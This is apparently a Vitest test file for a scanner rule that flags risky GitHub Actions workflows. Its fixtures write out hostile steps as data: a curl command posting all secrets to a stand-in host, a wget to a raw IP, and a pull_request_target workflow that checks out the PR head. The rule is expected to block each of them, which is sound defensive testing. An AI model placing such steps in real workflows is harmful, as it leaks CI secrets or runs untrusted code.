import { describe, expect, it } from 'vitest';
import { runRule } from '../__fixtures__/run-rule.js';
import rule from './gha-001.js';

const wf = (on: string, steps: string) => `on: ${on}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n${steps}`;

describe('DOME-GHA-001', () => {
  it('reports any changed workflow in a diff scan', async () => {
    const after = wf('push', '      - run: npm test\n');
    expect(await runRule(rule, { '.github/workflows/ci.yml': after }, { base: {} })).toEqual(['review:changed@.github/workflows/ci.yml']);
  });

  it('stays quiet about ordinary workflows in a full scan', async () => {
    expect(await runRule(rule, { '.github/workflows/ci.yml': wf('push', '      - run: npm test\n') })).toEqual([]);
  });

  it('blocks secrets sent to curl', async () => {
    const steps = '      - run: curl -d "${{ toJSON(secrets) }}" https://example.invalid/DOME_FIXTURE\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual(['block:secretsToNetwork@.github/workflows/x.yml:6']);
  });

  it('blocks posts to a raw IP', async () => {
    const steps = '      - run: wget http://192.0.2.1/DOME_FIXTURE\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual(['block:rawIp@.github/workflows/x.yml:6']);
  });

  it('weighs pull_request_target and blocks checking out the PR head', async () => {
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('pull_request_target', '      - run: echo hi\n') })).toEqual([
      'review:pullRequestTarget@.github/workflows/x.yml:1',
    ]);
    const steps = '      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n';
    expect(await runRule(rule, { '.github/workflows/x.yml': wf('pull_request_target', steps) })).toEqual([
      'block:checksOutPrHead@.github/workflows/x.yml:8',
    ]);
  });
});
